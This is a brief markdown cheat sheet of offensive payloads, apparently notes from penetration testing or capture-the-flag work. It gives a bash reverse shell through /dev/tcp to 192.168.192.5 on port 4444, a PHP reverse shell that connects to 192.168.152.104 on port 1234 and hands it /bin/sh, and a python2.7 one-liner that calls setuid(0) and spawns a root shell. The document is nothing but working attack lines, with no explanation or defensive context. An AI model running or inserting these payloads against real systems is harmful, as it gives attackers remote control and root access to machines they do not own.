## BASH
- bash -c 'bash -i >& /dev/tcp/192.168.192.5/4444 0>&1'
## PHP
- <?php
$sock = fsockopen("192.168.152.104", 1234);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
while (true) sleep(1);
?>

## python
- /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'